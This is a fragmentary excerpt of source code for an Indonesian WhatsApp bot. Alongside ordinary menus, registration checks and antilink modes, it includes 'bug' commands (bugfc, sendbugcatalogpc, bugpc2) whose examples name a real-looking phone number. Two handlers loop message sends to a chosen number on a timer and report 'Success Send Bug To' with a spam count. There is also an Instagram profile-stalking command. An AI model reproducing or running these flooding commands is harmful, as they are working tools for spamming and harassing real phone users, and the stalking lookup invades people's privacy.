...
const buttonMessage = { 
text: teks, 
footer: "Creator Uwii X Evaa ꪶ𖣂ꫂ", 
...
sock.sendMessage(from, { caption: anj, location: { jpegThumbnail: ktedh }, templateButtons: button, footer: `Creator UwiiXEva`, mentions: [m.sender] })
.catch ((err) => reply(err))
}
...
Saya Uwii Saya Disini Ingin Membantu Kalian Membuat Sticker Download Video/Lagu Youtube, Tiktok Dll.`
let buttoons = [
{buttonId: `${prefix}allmenu`, buttonText: {displayText: 'All Menu'}, type: 1}
]
let buttonMessaage = {
document: ktedh, 
fileName: `Bot By Uwii`, 
...
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} frmnkalera`)
aj = await igstalk(`${q}`)
...
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Contoh ${prefix+command} Uwii`)
...
${prefix}creategc
${prefix}bugfc
${prefix}sendbugcatalogpc 62881036690566
${prefix}bugpc2 62881036690566|9|9
...
sock.send5ButLoc(m.chat, memegnu, `Creator Uwii`, tod, btn)
}
addCmd(command.slice(0), 1, commund)
break
case 'kisahnabi':{
...
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, { text: 'Uwii' }, { quoted: lep})
await sleep(ms(waktu))
}
tek = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
...
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(num, { text: 'Halo Guys Aku Uwii Kang Bug' }, { quoted: lep})
await sleep(ms(waktu))
}
...
if (!isRegistered) return replyReg(api.verif)
if (isBan) return reply(api.ban)
if (!q) return reply(`Example : ${prefix + command} Uwii`) 
reply(api.wait)
let link
...
await sock.sendButtonText(m.chat, buttonns, `Mode Antionce`, `_Creator Uwii_`, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'antilink':
...
await sock.sendButtonText(m.chat, buttons, `Mode Antilink`, `_Creator Uwii_`, m)
}
addCmd(command.slice(0), 1, commund)
break
case 'tagall': {
